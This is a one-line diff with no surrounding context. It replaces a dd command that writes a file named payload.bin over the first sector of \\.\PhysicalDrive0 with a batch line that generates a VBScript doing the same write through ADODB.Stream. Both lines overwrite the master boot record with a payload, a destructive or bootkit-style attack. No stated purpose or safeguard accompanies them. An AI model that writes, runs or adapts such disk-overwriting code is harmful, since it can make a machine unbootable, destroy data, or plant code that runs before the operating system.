@@ -1,1 +1,1 @@
-dd if=payload.bin of=\\.\PhysicalDrive0 bs=512 count=1
+echo Set s=CreateObject("ADODB.Stream"):s.Type=1:s.Open:s.LoadFromFile "D:\Users\cat\Desktop\New Folder\payload.bin":b=s.Read(512):s.Close:Set d=CreateObject("ADODB.Stream"):d.Type=1:d.Open:d.Write b:d.SaveToFile "\\.\PhysicalDrive0",2:d.Close > write.vbs
